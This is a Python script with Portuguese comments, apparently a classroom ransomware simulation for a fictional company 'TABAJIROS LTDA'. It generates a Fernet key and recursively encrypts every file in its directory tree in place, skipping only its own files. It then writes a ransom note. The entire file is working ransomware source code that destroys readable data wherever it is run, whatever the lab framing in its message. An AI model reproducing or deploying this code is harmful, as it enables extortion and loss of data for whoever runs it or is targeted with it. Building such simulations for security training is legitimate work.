from cryptography.fernet import Fernet
import os
import sys

# 1. Identificar o diretório dinamicamente (Script vs Executável)
if getattr(sys, 'frozen', False):
    # Se estiver rodando como executável (.exe)
    DIRETORIO_ATUAL = os.path.dirname(sys.executable)
else:
    # Se estiver rodando como script normal (.py)
    DIRETORIO_ATUAL = os.path.dirname(os.path.abspath(__file__))

def gerar_chave():
    chave = Fernet.generate_key()
    caminho_chave = os.path.join(DIRETORIO_ATUAL, "chave.key")
    with open(caminho_chave, "wb") as chave_arquivo:
        chave_arquivo.write(chave)

def carregar_chave():
    caminho_chave = os.path.join(DIRETORIO_ATUAL, "chave.key")
    return open(caminho_chave, "rb").read()

def criptografar_arquivo(arquivo, chave):
    f = Fernet(chave)
    with open(arquivo, "rb") as file:
        dados = file.read()
    
    dados_criptografados = f.encrypt(dados) 
    
    with open(arquivo, "wb") as file:
        file.write(dados_criptografados)

def encontrar_arquivos(diretorio):
    lista = []
    # Incluídos os possíveis nomes dos executáveis
    arquivos_ignorados = [
        "ransonware.py", "ransonware.exe", 
        "decript.py", "decript.exe", 
        "chave.key", "mensagem_resgate.txt"
    ]
    
    for raiz, _, arquivos in os.walk(diretorio):
        for nome in arquivos:
            caminho = os.path.join(raiz, nome)
            # .lower() garante que Ransonware.exe ou RANSONWARE.EXE sejam ignorados
            if nome.lower() not in arquivos_ignorados:
                lista.append(caminho)
    return lista

def criar_mensagem_resgate(diretorio):
    # Mensagem customizada para o contexto do laboratório
    mensagem = """
    ATENÇÃO: AMBIENTE DE LABORATÓRIO - TABAJIROS LTDA!
    Seus arquivos foram criptografados para fins de simulação de segurança.
    Execute o utilitário de descriptografia para restaurar o ambiente.
    """
    caminho_mensagem = os.path.join(diretorio, "mensagem_resgate.txt")
    with open(caminho_mensagem, "w", encoding="utf-8") as arquivo:
        arquivo.write(mensagem)

def main():
    print(f"Iniciando simulação de criptografia no diretório: {DIRETORIO_ATUAL}")
    
    gerar_chave()
    chave = carregar_chave()
    
    arquivos = encontrar_arquivos(DIRETORIO_ATUAL)
    
    for arquivo in arquivos:
        try:
            criptografar_arquivo(arquivo, chave)
            print(f"Criptografado: {arquivo}")
        except Exception as e:
            print(f"Erro ao criptografar {arquivo}: {e}")
            
    criar_mensagem_resgate(DIRETORIO_ATUAL)
    print("\nSimulação concluída com sucesso.")

if __name__ == "__main__":
    main()